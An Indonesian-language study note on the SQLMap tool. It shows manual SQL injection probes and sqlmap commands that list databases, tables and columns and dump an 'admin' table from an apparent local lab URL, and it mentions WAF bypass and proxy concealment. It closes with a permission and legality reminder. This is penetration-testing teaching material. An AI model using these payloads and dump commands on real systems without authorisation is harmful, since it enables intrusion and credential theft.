---
id: SQL Map
aliases: []
tags:
  - hacking_fundamentals
  - hakcing_tools
---

Tags: [[hacking_intermediate]] [[hacking_tools]]

## Apa Itu SQLMap?

**SQLMap** adalah alat otomatis untuk pengujian penetrasi, yang dirancang untuk mendeteksi dan mengeksploitasi kerentanan **SQL Injection** pada aplikasi web. Alat ini dilengkapi dengan berbagai fitur yang mempermudah penyerangan dan pengujian keamanan, seperti:
- Deteksi otomatis tipe database.
- Teknik eksploitasi otomatis.
- Penggalian data sensitif dari database.

---

## Langkah-Langkah Menggunakan SQLMap

### 1. Mencari Target dengan Kerentanan SQL Injection
- Temukan parameter yang rentan, misalnya `id=1`.
- Tambahkan tanda petik (`'`) di belakang nilai parameter untuk memeriksa kerentanan:
  ```
  id=1'
  ```
  - Jika muncul *syntax error* dari database, ini indikasi awal kerentanan.
- Lakukan **balancing** dengan menambahkan komentar SQL untuk mengabaikan sisa query:
  ```
  id=1'-- -
  ```
  - Jika masih error, coba tanpa tanda petik:
    ```
    id=1-- -
    ```
- Jika respon kembali normal, maka target memiliki potensi kerentanan **SQL Injection**.

---

### 2. Menjalankan SQLMap untuk Eksploitasi Otomatis

#### Menampilkan Bantuan SQLMap
- Jalankan perintah berikut untuk melihat opsi lengkap:
  ```bash
  python sqlmap.py -h
  ```

Beberapa parameter penting:
- `-u` : Menargetkan URL.
- `-G` : Menggunakan hasil dari **Google Dorking**.
- `--dbms` : Menentukan tipe **Database Management System** (MySQL, PostgreSQL, dll.).
- `-p` : Menentukan parameter spesifik yang ingin diuji.
- `--level` : Tingkat pengujian (1-5).
- `--risk` : Tingkat risiko (1-3).
- `--technique` : Memilih teknik SQL Injection (misalnya: Boolean, Error, Union).

---

### 3. Langkah Eksekusi SQLMap

#### a. Menargetkan URL
Salin URL target, misalnya:
```text
https://local/vuln/read.php?id=1
```
Jalankan SQLMap untuk memeriksa database:
```bash
python sqlmap.py -u https://local/vuln/read.php?id=1 --dbs
```
- `--dbs` : Menampilkan daftar database yang tersedia.

#### b. Melihat Isi Database
Setelah database ditemukan, gunakan perintah untuk melihat tabel dalam database tertentu:
```bash
python sqlmap.py -u https://local/vuln/read.php?id=1 -D vulnlabs --tables
```
- `-D` : Menentukan nama database (contoh: `vulnlabs`).
- `--tables` : Menampilkan tabel dalam database.

#### c. Mengekstrak Kolom dari Tabel
Jika tabel ditemukan (contoh: `admin`), ekstrak kolom menggunakan:
```bash
python sqlmap.py -u https://local/vuln/read.php?id=1 -D vulnlabs -T admin --columns
```
- `-T` : Menentukan nama tabel (contoh: `admin`).
- `--columns` : Menampilkan kolom dalam tabel.

#### d. Mengekstrak Data dari Tabel
Untuk mengunduh semua data dari tabel, gunakan:
```bash
python sqlmap.py -u https://local/vuln/read.php?id=1 -D vulnlabs -T admin --dump
```
- `--dump` : Mengekstrak data dari tabel yang dipilih.

---

## Fitur Penting SQLMap
1. **Deteksi Otomatis Database Management System (DBMS):**
   SQLMap dapat secara otomatis mengenali jenis database (MySQL, PostgreSQL, MSSQL, Oracle, dll.).

2. **Berbagai Teknik Injeksi:**
   SQLMap mendukung teknik Boolean-based, Error-based, Union-based, Time-based, dan Out-of-band.

3. **Ekstraksi Data Sensitif:**
   Alat ini mampu mengekstrak data seperti username, password, email, dan kredensial lainnya.

4. **Bypass Proteksi Web:**
   Mendukung bypass **WAF (Web Application Firewall)** dengan fitur encoding payload.

5. **Integrasi dengan Proxy:**
   Mendukung integrasi proxy untuk menyamarkan aktivitas.

---

## Catatan Etika dan Hukum
- **Gunakan dengan Izin:** Hanya uji sistem yang Anda miliki atau dengan izin eksplisit dari pemilik.
- **Patuh Hukum:** Penggunaan tanpa izin dapat dianggap sebagai pelanggaran hukum di banyak negara.
- **Pelajari untuk Tujuan Positif:** SQLMap adalah alat pembelajaran dan audit keamanan, bukan alat perusak.
